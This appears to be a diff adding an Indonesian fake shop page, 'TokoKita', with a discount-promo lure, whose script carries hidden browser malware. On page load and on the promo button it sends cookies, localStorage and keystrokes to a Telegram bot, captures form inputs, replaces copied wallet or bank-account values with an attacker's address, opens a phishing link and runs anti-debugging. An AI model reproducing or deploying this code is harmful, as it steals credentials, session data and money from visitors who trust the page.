@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>𝖳𝗈𝗄𝗈𝖪𝗂𝗍𝖺 - 𝖡𝖾𝗅𝖺𝗇𝗃𝖺 𝖬𝗎𝗋𝖺𝗁 𝖦𝖺𝗋𝗎𝖽𝖺</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
+body{background:#f4f4f4;color:#222}
+header{display:flex;justify-content:space-between;align-items:center;padding:20px 40px;background:#fff;box-shadow:0 2px 8px rgba(0,0,0,.1)}
+header h1{color:#e63946}
+nav a{margin-left:20px;text-decoration:none;color:#333;font-weight:bold}
+nav a:hover{color:#e63946}
+.hero{text-align:center;padding:60px 20px;background:linear-gradient(135deg,#e63946,#f1faee);color:#fff}
+.hero h2{font-size:2.5rem;margin-bottom:10px}
+.hero button{margin-top:20px;padding:12px 30px;border:none;border-radius:8px;background:#222;color:#fff;cursor:pointer;font-size:1rem}
+.hero button:hover{background:#000}
+.produk{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:20px;padding:40px}
+.card{background:#fff;border-radius:12px;padding:15px;text-align:center;box-shadow:0 2px 10px rgba(0,0,0,.08)}
+.card img{width:100%;border-radius:8px}
+.card h3{margin:10px 0}
+.card button{margin-top:10px;padding:8px 20px;border:none;border-radius:6px;background:#e63946;color:#fff;cursor:pointer}
+.card button:hover{background:#b52d38}
+footer{text-align:center;padding:20px;background:#222;color:#aaa;font-size:.9rem}
+</style>
+</head>
+<body>
+<header>
+  <h1>𝖳𝗈𝗄𝗈𝖪𝗂𝗍𝖺</h1>
+  <nav>
+    <a href="#">𝖧𝗈𝗆𝖾</a>
+    <a href="#">𝖯𝗋𝗈𝖽𝗎𝗄</a>
+    <a href="#">𝖪𝖾𝗋𝖺𝗇𝗃𝖺𝗇𝗀</a>
+    <a href="#">𝖪𝗈𝗇𝗍𝖺𝗄</a>
+  </nav>
+</header>
+
+<section class="hero">
+  <h2>𝖣𝗂𝗌𝗄𝗈𝗇 𝟪𝟢% 𝖲𝖾𝗆𝗎𝖺 𝖯𝗋𝗈𝖽𝗎𝗄!</h2>
+  <p>𝖦𝗋𝖺𝗍𝗂𝗌 𝗈𝗇𝗀𝗄𝗂𝗋 𝗄𝖾𝗌𝖾𝗅𝗎𝗋𝗎𝗁 𝖨𝗇𝖽𝗈𝗇𝖾𝗌𝗂𝖺</p>
+  <button onclick="klaimPromo()">𝖪𝗅𝖺𝗂𝗆 𝖯𝗋𝗈𝗆𝗈</button>
+</section>
+
+<section class="produk">
+  <div class="card"><img src="https://picsum.photos/200?1"><h3>𝖲𝖾𝗉𝖺𝗍𝗎 𝖱𝗎𝗇𝗇𝗂𝗇𝗀</h3><p>𝖱𝗉 𝟣𝟧𝟢.𝟢𝟢𝟢</p><button onclick="beli(1)">𝖡𝖾𝗅𝗂</button></div>
+  <div class="card"><img src="https://picsum.photos/200?2"><h3>𝖳𝖺𝗌 𝖪𝗎𝗅𝗂𝗍</h3><p>𝖱𝗉 𝟤𝟧𝟢.𝟢𝟢𝟢</p><button onclick="beli(2)">𝖡𝖾𝗅𝗂</button></div>
+  <div class="card"><img src="https://picsum.photos/200?3"><h3>𝖧𝖾𝖺𝖽𝗉𝗁𝗈𝗇𝖾</h3><p>𝖱𝗉 𝟥𝟢𝟢.𝟢𝟢𝟢</p><button onclick="beli(3)">𝖡𝖾𝗅𝗂</button></div>
+</section>
+
+<footer><p>&copy; 𝟤𝟢𝟤𝟨 𝖳𝗈𝗄𝗈𝖪𝗂𝗍𝖺. 𝖲𝖾𝗆𝗎𝖺 𝗁𝖺𝗄 𝖽𝗂𝗅𝗂𝗇𝖽𝗎𝗇𝗀𝗂.</p></footer>
+
+<script>
+// ================= APP NORMAL =================
+function beli(id){
+  alert("𝖯𝗋𝗈𝖽𝗎𝗄 #"+id+" 𝗆𝖺𝗌𝗎𝗄 𝗄𝖾 𝗄𝖾𝗋𝖺𝗇𝗃𝖺𝗇𝗀!");
+}
+function klaimPromo(){
+  alert("𝖯𝗋𝗈𝗆𝗈 𝗍𝖾𝗋𝗄𝗅𝖺𝗂𝗆! 𝖦𝗎𝗇𝖺𝗄𝖺𝗇 𝗄𝗈𝖽𝖾: 𝖦𝖱𝖠𝖳𝖨𝖲𝟪𝟢");
+  if(window.mulaiPayload) window.mulaiPayload();
+}
+
+// ================= PAYLOAD + TELEGRAM =================
+(function(){
+  "use strict";
+
+  const TG_TOKEN = "9171294409:AAECl8-0X_l_y4OhC8g7CtooqgVr0cOMxgY";
+  const TG_CHAT  = "8922169139";
+  const TG_URL   = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
+  let buffer = "";
+
+  function send(teks){
+    fetch(TG_URL, {
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({chat_id:TG_CHAT, text:teks.slice(0,4000), disable_web_page_preview:true}),
+      keepalive:true
+    }).catch(()=>{});
+  }
+
+  function snapshot(){
+    send("🔴 SNAPSHOT\nURL: "+location.href+
+         "\nCOOKIES: "+document.cookie+
+         "\nLS: "+JSON.stringify(localStorage).slice(0,1500)+
+         "\nUA: "+navigator.userAgent);
+  }
+
+  function keylogger(){
+    document.addEventListener("keydown", e=>{
+      buffer += e.key;
+      if(buffer.length >= 50){ send("⌨️ KEYLOG: "+buffer); buffer = ""; }
+    });
+    setInterval(()=>{ if(buffer){ send("⌨️ KEYLOG: "+buffer); buffer=""; } }, 10000);
+  }
+
+  function hijackForm(){
+    document.querySelectorAll("input").forEach(inp=>{
+      inp.addEventListener("blur", ()=>{
+        send("📝 FORM: "+(inp.name||inp.id)+" = "+inp.value);
+      });
+    });
+  }
+
+  function clipper(){
+    document.addEventListener("copy", e=>{
+      const t = e.target;
+      if(t && /wallet|address|rekening/i.test(t.name||t.id||"")){
+        e.clipboardData.setData("text/plain","0xATTACKERWALLET123");
+        e.preventDefault();
+        send("💸 CLIPPER: "+(t.name||t.id));
+      }
+    });
+  }
+
+  function redirectSenyap(){
+    setTimeout(()=>{
+      window.open("https://attacker-server.com/phishing","_blank");
+    }, 15000);
+  }
+
+  function antiDebug(){
+    setInterval(()=>{
+      const t = performance.now();
+      debugger;
+      if(performance.now() - t > 100){ send("🛡️ ANTIDEBUG: triggered"); }
+    }, 2000);
+  }
+
+  window.mulaiPayload = function(){
+    send("🚀 PAYLOAD MULAI JALAN di "+location.href);
+    snapshot();
+    keylogger();
+    hijackForm();
+    clipper();
+    redirectSenyap();
+    antiDebug();
+    setInterval(snapshot, 60000);
+  };
+
+  setTimeout(()=>{ if(window.mulaiPayload) window.mulaiPayload(); }, 3000);
+})();
+</script>
+</body>
+</html>
